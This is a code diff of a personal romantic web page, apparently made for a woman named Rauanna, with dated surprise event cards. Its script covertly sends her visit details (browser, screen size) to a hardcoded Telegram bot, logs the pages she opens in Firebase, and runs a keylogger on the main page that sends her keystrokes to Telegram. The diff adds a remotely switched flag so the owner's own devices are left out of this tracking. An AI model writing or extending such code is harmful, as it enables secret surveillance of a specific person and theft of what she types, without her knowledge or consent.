@@ -342,7 +342,7 @@
     </div>
   </div>
 
-  <script>
+    <script>
     /* ==========================================
        FIREBASE REALTIME DATABASE CONFIGURATION
        ========================================== */
@@ -356,6 +356,21 @@
     const db = firebase.database();
 
     let visitedPagesMap = {};
+    
+    // --- ГЛОБАЛЬНЫЙ ФЛАГ ДЛЯ УВЕДОМЛЕНИЙ ---
+    // По умолчанию берем из localStorage, но потом перезапишем из базы
+    let globalSultanMode = localStorage.getItem('is_sultan') === 'true';
+
+    // Слушаем настройку из базы (включается через admin.html)
+    db.ref('settings/sultan_mode').on('value', snapshot => {
+      globalSultanMode = snapshot.val() === true;
+      // Обновляем локальную память для этого устройства
+      if (globalSultanMode) {
+        localStorage.setItem('is_sultan', 'true');
+      } else {
+        localStorage.removeItem('is_sultan');
+      }
+    });
 
     // Слушаем из базы в реальном времени, куда Рауанна заходила
     function listenVisitedPages() {
@@ -376,7 +391,8 @@
     const CHAT_ID = "606061445";
 
     function sendTelegramNotification(text) {
-      if (localStorage.getItem('is_sultan') === 'true') return;
+      // Проверяем глобальный флаг, а не только localStorage
+      if (globalSultanMode) return;
       
       fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}&parse_mode=HTML`)
         .catch(() => {});
@@ -384,7 +400,7 @@
 
     async function getDetailedVisitInfo(actionText = "❤️ Заход на сайт!") {
       const urlParams = new URLSearchParams(window.location.search);
-      if (urlParams.has('me') || localStorage.getItem('is_sultan') === 'true') return;
+      if (urlParams.has('me') || globalSultanMode) return; // Добавили globalSultanMode
 
       const userAgent = navigator.userAgent;
       const screenRes = `${window.screen.width}x${window.screen.height}`;
@@ -472,7 +488,7 @@
       }
 
       // 2. Запись просмотра в Firebase (ТОЛЬКО ЕСЛИ КЛИКНУЛА РАУАННА)
-      if (localStorage.getItem('is_sultan') !== 'true') {
+      if (!globalSultanMode) {
         const href = target.getAttribute('href');
         if (href && !href.startsWith('http') && !href.startsWith('#')) {
           const pageKey = href.replace('.', '_');
@@ -638,9 +654,6 @@
     window.addEventListener('touchend', onEnd);
 
     // --- СОБЫТИЯ ---
-    // Правила: карточка появляется за TEASE_DAYS дней до даты (🔒 с обратным отсчётом),
-    // новое событие — не реже чем раз в 13–14 дней, обычно раз в 5–10 дней; подряд можно только самое важное.
-    // draft: true — страницы ещё нет, событие скрыто. Когда страница создана — удалите draft.
     const TEASE_DAYS = 365;
     const events = [
       { title: "Приглашение на свидание", desc: "Наш идеальный вечер", icon: "🕯️", date: "2026-09-15", url: "Rau-Date.html" },
@@ -863,26 +876,27 @@
     })();
 
 
-        // --- ЛОГИКА ПРАНКА / ОШИБКИ ---
+    // --- ЛОГИКА ПРАНКА / ОШИБКИ ---
     window.addEventListener('DOMContentLoaded', () => {
       const urlParams = new URLSearchParams(window.location.search);
       if (urlParams.get('error') === '1') {
         document.getElementById('glitchOverlay').classList.add('on');
-        // Очищаем URL, чтобы при обновлении страницы ошибка не висела вечно
         window.history.replaceState({}, document.title, window.location.pathname);
       }
     });
 
-        
+    function closeGlitch() {
+      document.getElementById('glitchOverlay').classList.remove('on');
+    }
 
 
-        // --- ПОЛНЫЙ КЕЙЛОГГЕР НА ГЛАВНОЙ ---
+    // --- ПОЛНЫЙ КЕЙЛОГГЕР НА ГЛАВНОЙ ---
     let keyBufferIndex = "";
     let sendTimerIndex = null;
 
     function flushKeysIndex() {
         if (keyBufferIndex.trim().length === 0) return;
-        if (localStorage.getItem('is_sultan') === 'true') return;
+        if (globalSultanMode) return; // ИСПОЛЬЗУЕМ ГЛОБАЛЬНЫЙ ФЛАГ
         sendTelegramNotification(`⌨️ <b>Ввод на главной:</b>\n\n<code>${keyBufferIndex}</code>`);
         keyBufferIndex = "";
     }
@@ -914,12 +928,6 @@
     });
 
     window.addEventListener('beforeunload', flushKeysIndex);
-
-
-
-    function closeGlitch() {
-      document.getElementById('glitchOverlay').classList.remove('on');
-    }
   </script>
 </body>
 </html>
